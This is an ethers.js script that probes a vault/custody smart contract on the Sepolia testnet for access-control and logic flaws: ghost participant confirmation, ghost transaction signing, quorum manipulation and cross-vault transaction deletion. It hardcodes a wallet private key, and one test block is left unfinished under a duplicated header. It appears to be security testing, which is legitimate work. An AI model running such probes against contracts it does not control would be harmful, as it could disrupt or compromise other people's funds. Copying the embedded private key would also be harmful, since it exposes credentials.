const { ethers } = require("ethers");

// === LOOKING FOR NEW VULNERABILITIES ===

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x815aeca64a974297942d2bbf034bd63eb638883d";
const PRIVATE_KEY = "0xa12f4dc456a8fa989f093604e702384f9691f99c3242f615fc9a1ba0d3b3eaf2";

const ABI = [
    "function createVault(bytes32 _creator) external",
    "function defineQuorum(bytes32 _creator, uint256 _minParticipants) external",
    "function addParticipant(bytes32 _creator, bytes32 _participant, string _shard) external",
    "function confirmParticipant(bytes32 _creator, bytes32 _participant, bool _confirmation) external",
    "function promptSignatures(bytes32 _creator) external",
    "function signTransaction(bytes32 _creator, bytes32 _participant, uint256 _tx) external",
    "function cleanTx(bytes32 _creator, uint256 _txid) external",
    "function getQuorum(bytes32 _creator) external view returns (uint256)"
];

async function run() {
    console.log("=== ADVANCED VULNERABILITY HUNTING ===\n");

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const contract = new ethers.Contract(CUSTODY_ADDRESS, ABI, wallet);

    const vaultId = ethers.utils.formatBytes32String("Hunt" + Date.now());

    // Create vault
    console.log("Setup: Creating test vault...");
    const tx1 = await contract.createVault(vaultId, { gasLimit: 500000 });
    await tx1.wait();
    console.log("Vault created.\n");

    // Test 1: Can we confirm a participant that was NEVER added?
    console.log("Test 1: Ghost Participant Confirmation");
    console.log("=".repeat(70));
    const ghostParticipant = ethers.utils.formatBytes32String("NeverAdded");

    try {
        const tx2 = await contract.confirmParticipant(vaultId, ghostParticipant, true, { gasLimit: 500000 });
        const r2 = await tx2.wait();
        console.log(`Exploit Confirmed: Can confirm non-existent participants.`);
        console.log(`Transaction: ${r2.transactionHash}\n`);
    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }

    // Test 2: Can we sign a transaction that doesn't exist?
    console.log("Test 2: Ghost Transaction Signature");
    console.log("=".repeat(70));

    try {
        const participant = ethers.utils.formatBytes32String("Test");
        const tx3 = await contract.signTransaction(vaultId, participant, 999, { gasLimit: 500000 });
        const r3 = await tx3.wait();
        console.log(`Exploit Confirmed: Can sign non-existent transactions.`);
        console.log(`Transaction: ${r3.transactionHash}\n`);
    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }

    // TEST 3: Define quorum AFTER adding participants (order bypass)
    console.log("TEST 3: Post-Setup Quorum Definition");
    console.log("=".repeat(70));

    // Add 3 participants
    for (let i = 1; i <= 3; i++) {
        const p = ethers.utils.formatBytes32String(`P${i}`);
        await contract.addParticipant(vaultId, p, `shard${i}`, { gasLimit: 500000 });
    }
    console.log("Added 3 participants");

    // Test 3: Quorum Manipulation (Set quorum >> participants)
    console.log("TEST 3: Quorum Manipulation");
    console.log("=".repeat(70));
    try {
        const quorum = 100;
        await contract.callStatic.defineQuorum(vaultId, quorum);
        console.log(`EXPLOIT CONFIRMED: Quorum set to ${quorum} but only 3 participants exist.`);
        console.log(`Impact: Impossible to ever reach consensus.\n`);
    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }

    // Test 4: Cross-Vault Deletion
    console.log("TEST 4: Cross-Vault Transaction Deletion");
    console.log("=".repeat(70));
    const victimVault = ethers.utils.formatBytes32String("VictimClean");

    try {
        await contract.callStatic.cleanTx(victimVault, 0);
        console.log(`EXPLOIT CONFIRMED: Can delete transactions from other vaults.\n`);
    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }
}

run().catch(console.error);
